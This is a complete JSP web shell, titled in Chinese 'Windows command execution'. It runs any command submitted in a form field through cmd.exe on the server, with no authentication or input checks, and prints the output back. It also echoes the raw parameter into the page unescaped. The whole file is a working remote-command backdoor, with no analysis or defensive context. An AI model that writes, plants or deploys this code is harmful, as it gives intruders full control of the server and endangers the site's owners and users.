<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>
<html>
<head>
    <title>Windows命令执行</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 800px; margin: 0 auto; }
        pre { 
            background-color: #f0f0f0; 
            padding: 10px; 
            border-radius: 5px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        form { margin-bottom: 20px; }
        input[type="text"] { width: 70%; padding: 8px; }
        input[type="submit"] { padding: 8px 15px; }
        .warning {
            color: red;
            background-color: #ffecec;
            padding: 10px;
            border: 1px solid red;
            border-radius: 5px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>Windows命令执行</h1>

    <form method="post">
        输入Windows命令: 
        <input type="text" name="command" value="<%= request.getParameter("command") != null ? 
            request.getParameter("command") : "ipconfig" %>">
        <input type="submit" value="执行">
    </form>
    
    <%
    String userCommand = request.getParameter("command");
    if (userCommand != null && !userCommand.trim().isEmpty()) {
        StringBuilder output = new StringBuilder();
        Process process = null;
        BufferedReader reader = null;
        
        try {
            String[] cmdArray = {"cmd.exe", "/c", userCommand};
            
            process = Runtime.getRuntime().exec(cmdArray);
            
            reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            reader = new BufferedReader(new InputStreamReader(process.getErrorStream(), "GBK"));
            while ((line = reader.readLine()) != null) {
                output.append("[ERROR] ").append(line).append("\n");
            }
            
            int exitValue = process.waitFor();
            output.append("\n命令执行完成，退出码: ").append(exitValue);
            
        } catch (Exception e) {
            output.append("执行命令时出错: ").append(e.toString());
        } finally {
            if (reader != null) {
                try { reader.close(); } catch (IOException e) {}
            }
            if (process != null) {
                process.destroy();
            }
        }
    %>
    
    <h3>执行结果:</h3>
    <pre><%= output.toString() %></pre>
    <%
    }
    %>
</div>
</body>
</html>